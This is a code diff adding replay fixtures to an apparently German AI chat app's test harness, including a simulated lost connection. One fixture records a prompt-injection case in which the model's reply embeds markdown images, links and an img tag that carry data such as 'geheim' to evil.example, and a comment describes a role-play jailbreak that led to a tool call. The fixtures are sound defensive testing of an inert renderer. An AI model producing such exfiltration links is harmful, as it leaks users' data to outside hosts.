@@ -81,6 +81,21 @@ const TRANSCRIPTS: Readonly<Record<string, readonly ReplayAttempt[]>> = {
       finish('tool-calls', 1200, 80),
     ],
   ],
+  // Injection case (B21, werk-flow/werkflow-planning#530): a document told the model to send data
+  // out through the chat itself; it writes images, links and markup that carry the data to an
+  // outside host. The renderer must show all of it inert.
+  ausleiten: [
+    () => [
+      ...textParts(
+        'Hier ist die Zusammenfassung. ',
+        '![Status](https://evil.example/p.png?d=Kunde%20M%C3%BCller)\n\n',
+        '[Lieferschein öffnen](https://evil.example/l?d=A-1001) und [deine Aufgaben](/aufgaben)\n\n',
+        '<img src="https://evil.example/i.png?d=geheim"> <https://evil.example/a?d=geheim>\n\n',
+        '[Beleg][1]\n\n[1]: https://evil.example/r?d=geheim',
+      ),
+      finish('stop', 1400, 120),
+    ],
+  ],
   // Injection case (B21): the person asks the model to play a role without rules and to rate the
   // workers; the model falls for it and calls a tool that would. No tool runs, the next step's
   // instructions are the same system prompt, and the answer is only text.
@@ -163,6 +178,17 @@ const TRANSCRIPTS: Readonly<Record<string, readonly ReplayAttempt[]>> = {
   ],
   // A provider failure whose body quotes the user's message: it must never reach a log (B17).
   'echo-fehler': [(userText) => providerError(500, JSON.stringify({ error: { message: userText } }))],
+  // The connection drops after the request left, before any answer: the provider may have taken it.
+  'verbindung-vor-antwort': [
+    () =>
+      new APICallError({
+        message: 'replayed lost connection',
+        url: 'replay://messages',
+        requestBodyValues: {},
+        isRetryable: true,
+      }),
+    answer,
+  ],
 };
 
 function latestUserText(options: StreamOptions): string {
